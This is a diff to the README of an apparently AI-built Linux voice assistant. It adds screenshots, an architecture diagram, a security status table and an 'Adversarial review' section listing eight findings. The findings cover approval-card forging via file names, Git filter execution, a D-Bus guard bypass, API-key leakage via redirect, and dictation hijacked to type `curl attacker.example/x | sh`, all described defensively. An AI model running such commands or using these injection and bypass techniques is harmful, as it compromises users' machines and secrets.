@@ -4,6 +4,11 @@ A voice assistant for the Linux desktop. Press a shortcut or hold Fn, talk, and 
 
 Speech recognition, the language model and speech synthesis run on a [LocalAI](https://localai.io) server of your own. Tuxistant is the desktop side: a GNOME Shell extension, a small daemon and a Settings app.
 
+<p align="center">
+  <img src="docs/images/turn.gif" width="800" alt="Tux on a desktop. Words appear in a caption as they are heard, Tux thinks, then speaks while the caption shows the reply about the weather.">
+</p>
+<p align="center"><em>The real extension in an isolated GNOME Shell, with a scripted question and reply.</em></p>
+
 ## Requirements
 
 - GNOME Shell 50 on Wayland
@@ -44,6 +49,16 @@ During a turn you can also right-click the blob to switch theme, open Settings o
 
 Nothing listens or speaks while the screen is locked: a turn in progress stops, and the shortcut, Fn and `tuxistant say` do nothing until you unlock.
 
+<p align="center">
+  <img src="docs/images/panel-menu.png" width="350" alt="The panel menu: Talk, Theme, six recent requests and Settings.">
+</p>
+
+### Themes
+
+Four themes come with it, and each one reacts as Tux listens, thinks and speaks. Pick one from the panel icon or in Settings, or [write your own](docs/THEMES.md).
+
+![Listening Tux, Orb, Waves and Scanner, each while speaking.](docs/images/themes-row.png)
+
 ### Dictation
 
 Tap Fn, then press it again and hold it while you speak. When you let go, your words are typed where your cursor is, in any language Whisper knows. For longer passages, or without Fn, `Ctrl+Super+D` starts and stops it.
@@ -65,9 +80,28 @@ It only ever types: it never presses Enter, so nothing is sent or run until you 
 
 **Approval cards.** Anything that changes something, or sends a file off this computer, puts a card on screen saying exactly what will happen, and only a click on Allow goes ahead. Saying yes doesn't count, because a voice nearby could say it. No answer in 45 seconds counts as no. Every action and answer is listed in History. [docs/SKILLS.md](docs/SKILLS.md) has the rules.
 
+| A normal card | A card for something that runs as administrator |
+|---|---|
+| ![A card asking to move 3 files and 1 folder to the Trash, listing each one, with Deny and Allow buttons.](docs/images/card-trash.png) | ![A red card asking to run apt-get install as administrator, with Deny and Allow as administrator buttons.](docs/images/card-admin.png) |
+
 **Cloud.** Complex requests stay on your own server unless you turn on Cloud in Settings, which is off by default and needs your own Anthropic API key. With it on, Claude sees your request plus file names and command output from that task. File contents go only if you click to allow each one. It needs the Anthropic SDK: run `./install.sh --cloud-sdk`.
 
 **Settings** has pages for General (server, API key, listening, shortcut, phone, translation, cloud, instructions), Voice, Appearance, Skills and History.
+
+| General | Skills |
+|---|---|
+| ![The General page: server address, API key, pipeline, listening and weather.](docs/images/settings-general.png) | ![The Skills page: each skill with what it can do and its risk.](docs/images/settings-skills.png) |
+
+<details>
+<summary>The other pages</summary>
+
+![The Voice page: a searchable list of voices with a play button each.](docs/images/settings-voice.png)
+
+![The Appearance page: the four themes, each with a Try button.](docs/images/settings-appearance.png)
+
+![The History page: recent requests.](docs/images/settings-history.png)
+
+</details>
 
 The same things work from a terminal:
 
@@ -83,14 +117,17 @@ The same things work from a terminal:
 
 ## How it fits together
 
-```
- GNOME Shell extension            tuxistant daemon                  LocalAI
- blob, captions, shortcut  <--->  turns, audio, skills,   <------>  speech, model,
- panel icon, menus        D-Bus   history, config        WebSocket  voice
-                                    ^           ^
- Settings app  <--------------------+           |
-                     D-Bus                      | Unix socket: down, up, other
-                                         tuxistant-fn (system service, sandboxed)
+```mermaid
+flowchart LR
+    extension["<b>GNOME Shell extension</b><br/>blob, captions, shortcut,<br/>panel icon, menus"]
+    settings["<b>Settings app</b>"]
+    daemon["<b>tuxistant daemon</b><br/>turns, audio, skills,<br/>history, config"]
+    localai["<b>LocalAI</b><br/>speech, model, voice"]
+    helper["<b>tuxistant-fn</b><br/>system service, sandboxed"]
+    extension <-->|D-Bus| daemon
+    settings <-->|D-Bus| daemon
+    daemon <-->|WebSocket| localai
+    helper -->|"Unix socket:<br/>down, up, other"| daemon
 ```
 
 - **Daemon** (`tuxistant/`): runs as a systemd user service and starts on demand through D-Bus. It owns the conversation, the microphone and speaker through PipeWire, skills, history and config. With the Fn helper installed it also starts at login, so that holding Fn works straight away.
@@ -112,6 +149,83 @@ The same things work from a terminal:
 - Once a conversation has read your files, command output or selected text, anything reaching past your own server needs a click.
 - History stays on this machine in `~/.local/share/tuxistant/history.db`, readable only by you. You can clear it in Settings.
 - The API key lives in `~/.config/tuxistant/config.json`, readable only by you. It is not sent over D-Bus to the extension or to Settings, and changing the server clears it, so that it only ever goes to the server it was given for. For TLS, enter the server as `https://host:port`.
+
+## Skills and security
+
+Skills are how Tux gets new abilities, and the plan includes skills people can share through a community registry. That registry hasn't been started. Today there is no way to install someone else's skill, because every action is built into Tuxistant, so a community skill can't reach your computer yet.
+
+The plan starts from one assumption: a bad skill will eventually get past review. Review helps, but permissions and the sandbox have to be what protects you.
+
+| Protection | Status |
+|---|---|
+| Risk computed from permissions | Built |
+| Every risky action goes through a card | Built |
+| Private data can't leave without a click | Built |
+| Read-only shell commands run in a sandbox | Built, for the shell skill only |
+| Each skill confined to its declared permissions at run time | **Planned** |
+| Signing, hash pinning, re-approving new permissions | **Planned** |
+| Publisher namespaces against lookalike names | **Planned** |
+| Sandbox for skills with their own code | **Planned** |
+
+Confining each skill at run time matters most, because that's what has to hold once a bad skill gets through. Shell access stays built in, and community skills will never be able to request it. [docs/ROADMAP.md](docs/ROADMAP.md#rules-for-shared-skills) has the rules for shared skills and the order of the work.
+
+## Adversarial review
+
+Tuxistant can read your files, run commands and send things off your computer, and the model driving it can be steered by any text it reads. So "does it work?" isn't enough of a question. Each big round of work also has to survive someone trying to break it.
+
+Tuxistant is built with AI coding agents (Claude). The reviewers are separate agents that didn't write the code they are attacking, and the project's owner decides what ships.
+
+### How a review runs
+
+```mermaid
+flowchart LR
+    build["Builders finish<br/>and report"] --> attack["Reviewers attack it,<br/>one lens each"]
+    attack --> real{"Reproduced?"}
+    real -->|no| dropped["Not a finding"]
+    real -->|yes| fix["Fix it"]
+    fix --> test["The attack<br/>becomes a test"]
+    test --> prove["Break the guard:<br/>the test must fail"]
+    prove --> suite["Full suite and<br/>live evaluations"]
+```
+
+- **Reports are claims, not facts.** Reviewers get what the builders said they did, with orders to check it rather than believe it.
+- **One lens each.** The attacker assumes a hostile file name, document, web page or tool output has already reached the model, and that the model will now make any tool call the attacker wants. Its job is to get something harmful done without a real click, or to get a click on a card that lies. The integration reviewer runs the whole suite and follows real requests across the parts, because the seams between separately built parts are where bugs gather.
+- **Reproduce it or it doesn't count.** Findings need a concrete scenario, tried for real where that's safe: real commands through the real sandbox, in a throwaway home folder. Style notes aren't allowed, and each finding says whether it was reproduced or only read.
+- **Reviewers can't change anything.** They are read-only on the project, and are told to stay off the real desktop, files, phone and clipboard.
+- **They also report what held.** A list of attacks that failed, and of what was never tried, shows how far a clean result reaches.
+- **A test has to be seen failing.** After a fix, the guard is broken on purpose in a throwaway copy to prove its test notices, and only once the same tests pass with nothing broken.
+
+### What it has caught
+
+| Round | Reviewers | Result |
+|---|---|---|
+| First build | Requirements, shell, security, daemon | 36 problems confirmed, some of them duplicates |
+| Skills, shell and approval cards | Attacker, integration | 22 problems reproduced, none rated critical, and 26 attacks and checks that held |
+| Dictation | Security | Numbers 5 and 6 below |
+
+All eight of these really happened in this project. Each one has a test or a code fix behind it, except number 7, which is written up in [docs/TESTING.md](docs/TESTING.md). [docs/SECURITY.md](docs/SECURITY.md) keeps the list as it grows.
+
+1. **The file name that forges the approval card.** An attacker names a file `a.tmp`, then a line break, then `only-this-harmless-file.tmp`. When you ask to delete `*.tmp`, the card looks as if it lists one harmless file, while the real list is hidden. Tuxistant shows line breaks, tabs, escape codes and text-direction characters as visible codes, so a name can't draw its own line.
+2. **The repository that runs code when you look at it.** A downloaded Git repository can name a "filter" program in its own config, and plain `git status` will run it. Each attack in the test suite is first shown working on ordinary Git in the same sandbox, so a pass proves the defence stopped it. Tuxistant runs Git with hooks and filters turned off.
+3. **Getting past the guard by leaving something out.** Only GNOME Shell may answer an approval card, and the first guard checked the D-Bus interface name. A call can leave the interface out and still reach the method, which bypassed the check. The guard now matches on the method name alone.
+4. **The redirect that steals your key.** A server answers with a redirect to another host, hoping the API key follows. Tuxistant refuses redirects and ignores proxies. In the test, the second host receives nothing.
+5. **Choosing the words you dictate.** Another program on your desktop pointed Tuxistant at its own server, then started dictation. Its server received the audio and chose the text, so `curl attacker.example/x | sh` appeared in the terminal. Dictation can never press Enter, so the command didn't run. Now only the shell can start dictation, and the words go to the shell alone rather than across the session bus. This isn't fully closed: a program running as you can still change the server setting, so it could still choose the words of a dictation you start yourself. It can't start one or press Enter.
+6. **Your password, pasted into the wrong app.** Some apps need a paste, so Tuxistant borrows the clipboard and puts it back after a moment. The review used an app that took 1.2 seconds to respond. By then the clipboard had been restored, and the app received `my-bank-password` instead of the dictated words. The wait is now 2 seconds, and that app gets the words, but the wait is still fixed: an app slower than that could still get the old clipboard.
+7. **The test result that proved nothing.** A check that breaks each safety guard on purpose reported 18 of 18 caught. Every test had actually died at import, so nothing had been tested. The check now refuses to run unless the same tests pass with nothing broken first.
+8. **The fix that crashed the desktop.** Fixing a clipboard bug introduced a worse one: code held on to memory it didn't own, and GNOME Shell crashed. On Wayland that ends your whole session. It was caught in an isolated test shell, and the rule is now in the project's [contract](docs/CONTRACT.md).
+
+### How it makes the code stronger
+
+- **Attacks stay.** A fixed finding becomes a test that runs for good. [tests/test_review_regressions.py](tests/test_review_regressions.py) has 47, and [tests/test_shellgate.py](tests/test_shellgate.py) keeps 260 more against the real sandbox, so a later change can't quietly reopen a hole.
+- **Fixes aim at the whole kind of bug.** A list of secret folders became the opposite rule: everything in `~/.config` and `~/.local` is hidden from read-only commands unless it's allowed, so what a new app keeps there is hidden from its first day.
+- **It finds the bugs users would meet.** The integration lens found that opening a PDF reported failure while the file sat on screen, that "open the second one" could never work with default settings, and that a broken voice turned a finished translation into an error.
+- **Lessons become rules.** What went wrong is written into [docs/TESTING.md](docs/TESTING.md) and the project's rules, so the next round starts from it.
+
+### What it doesn't do
+
+- It doesn't replace an outside audit, and there hasn't been one. The reviewers are AI agents like the builders, so they may share blind spots.
+- It only covers what was tried. The second round didn't exercise real administrator prompts, real phone transfers or a real call to Claude. [docs/ROADMAP.md](docs/ROADMAP.md) lists what still has to be checked on a real desktop.
+- It doesn't make testing safe by itself. [docs/TESTING.md](docs/TESTING.md) records the times a test run reached the real desktop, and what changed afterwards.
 
 ## Development
 
